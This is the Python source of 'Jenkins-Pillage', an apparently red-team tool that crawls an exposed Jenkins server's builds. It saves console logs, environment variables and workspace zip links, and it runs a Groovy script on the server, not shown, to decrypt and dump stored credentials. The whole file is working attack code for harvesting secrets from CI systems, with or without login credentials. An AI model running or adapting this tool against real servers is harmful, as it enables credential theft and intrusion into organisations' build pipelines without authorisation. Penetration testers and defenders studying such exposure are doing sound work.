#!/usr/bin/env python3
# @DolosGroup
# Jenkins-Pillage is a tool to extract sensitive information
# from an exposed Jenkins server.

import argparse
import sys
from pathlib import Path
from typing import List, NoReturn
from multiprocessing import Pool, cpu_count

from requests.auth import HTTPBasicAuth
from lib.libjenkinspillage import JenkinsConnection, get_all_build_links


def decrypt_all_secrets(jenkins_build_object: JenkinsConnection) -> List[str]:
    """
    If we have permission to execute scripts, return list of decrypted secrets
    """

    filename = f"{Path().absolute()}/groovy/decrypt-credentials.groovy"
    creds = jenkins_build_object.execute_script(script=filename)
    if creds:
        print("-- FOUND CREDENTIALS IN CREDENTIAL STORE")
        output_filename = jenkins_build_object.url.replace("/", "__") + ".creds"
        with open(output_filename, "w") as file:
            file.write(creds)


def write_out_console_output(jenkins_build_object):
    """
    Write out console output from provided build
    """

    content = jenkins_build_object.get_console_text()
    if content:
        print(f"-- FOUND CONSOLE OUTPUT AT {jenkins_build_object.url}")
        output_filename = (
            jenkins_build_object.url.replace("/", "__") + ".console_output"
        )
        with open(output_filename, "w") as file:
            file.write(content)


def write_out_zip_urls(jenkins_build_object):
    """
    Write out URL to zip file we can download from Jenkins
    containing workspace contents
    """

    content = jenkins_build_object.get_workspace_zip()
    if content is not None:
        print("-- FOUND WORKSPACE ZIP URL")
        url_filename = jenkins_build_object.url.replace("/", "__") + ".workspace_url"
        with open(url_filename, "w") as file:
            file.write(content)


def write_out_env_vars(jenkins_build_object):
    """
    Write out any environment variables from build
    """

    content = jenkins_build_object.get_env_vars()
    if content and content is not None:
        print("-- FOUND ENV VARS")
        content = str(content).replace(",", "\n")
        env_vars_filename = jenkins_build_object.url.replace("/", "__") + ".env_vars"
        with open(env_vars_filename, "w") as file:
            file.write(content)


def goodies(url: str, auth: HTTPBasicAuth) -> NoReturn:
    """
    Target for multiprocessing of links
    """

    build = JenkinsConnection(url, auth=auth)
    print("Attempting: {}".format(build.url))
    write_out_console_output(build)
    write_out_zip_urls(build)
    write_out_env_vars(build)


def main():
    """Main Execution"""
    # Setup help output
    parser = argparse.ArgumentParser(
        description="Pillage sensitive information from Jenkins servers"
    )
    parser.add_argument(
        "-b", "--buildurl", dest="build_url", help="The build URL to pillage"
    )
    parser.add_argument(
        "-u",
        "--user",
        dest="username",
        help="The Basic Auth username for the service",
        required=False,
        default=None,
    )
    parser.add_argument(
        "-p",
        "--password",
        dest="password",
        required=False,
        default=None,
        help="The Basic Auth password for the service",
    )
    parser.add_argument(
        "-l",
        "--list",
        dest="list_url",
        help="Lists all found build URLs to use with -b",
    )
    parser.add_argument(
        "-a",
        "--auto",
        dest="auto",
        help="Automatically perform -l and then -b on a root URL",
    )
    parser.add_argument(
        "-f",
        "--force",
        dest="force",
        action="store_true",
        help="Force the URLs to use the supplied socket (in case the server returns localhost)",
    )
    args = parser.parse_args()
    if args.username:
        auth = HTTPBasicAuth(
            args.username, args.password or input("Please provide your password: ")
        )
    else:
        auth = None
    if args.auto:
        print("Getting a list of all build URLs")
        build_links = get_all_build_links(args.auto, auth=auth, netloc_force=args.force)
        with Pool(processes=int(cpu_count() - 1) or 1) as pool:
            pool.starmap(goodies, [(link, auth) for link in build_links])
        decrypt_all_secrets(JenkinsConnection(args.auto, auth=auth))

    if args.list_url:
        build_links = get_all_build_links(
            args.list_url, auth=auth, netloc_force=args.force
        )

    if args.build_url:
        goodies(url=args.build_url, auth=auth)


if __name__ == "__main__":
    sys.exit(main())
